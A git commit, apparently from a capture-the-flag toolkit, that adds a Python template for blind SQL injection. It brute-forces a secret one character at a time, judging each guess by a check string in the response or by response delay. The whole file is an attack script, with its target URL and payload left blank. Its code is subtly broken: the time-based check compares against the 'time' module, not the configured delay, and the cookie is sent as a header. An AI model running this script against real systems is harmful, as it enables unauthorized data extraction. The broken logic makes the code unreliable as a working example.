236252fa53184ccb4d7d7bf431d7aa9bed17566d
sihadan <def6488@gmail.com>
2017-11-10 19:43:57 +0900

    add blind injection

---
+++ Web/SQL_Injection/Blind_Injection_Template.py
@@ -0,0 +1,60 @@
+import requests
+import time
+
+# candidates
+num = '1234567890'
+alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+alnum = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+alnumsu = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_ '
+alnumnoregex = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_~!@- '
+alnumchr = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$^&*()-=+_%{} '
+
+
+# exploit settings
+url = ''                # url for request
+candidate = alpha       # candidate for blind SQLi
+flag_len = 0            # length of flag
+request_type = 'GET'    # GET of POST
+session_name = ''
+session = ''
+check_string = ''
+
+# time based settings
+time_based = False
+check_time = 2
+
+cookie = {session_name: session}
+flag = ''
+for idx in range(0, flag_len):
+    for c in candidate:
+
+        payload = {
+
+        }
+        response = None
+
+        s = time.time()
+
+        if request_type == 'GET':
+            response = requests.get(url=url, headers=cookie, params=payload)
+        elif request_type == 'POST':
+            response = requests.post(url=url, headers=cookie, data=payload)
+        elif request_type == 'JSON':
+            response = requests.post(url=url, headers=cookie, json=payload)
+
+        e = time.time()
+
+        r = response.text
+
+        if time_based:
+            if e-s > time:
+                print(idx, c)
+                flag += c
+                break
+        else:
+            if check_string in r:
+                print(idx, c)
+                flag += c
+                break
+
+print(flag)
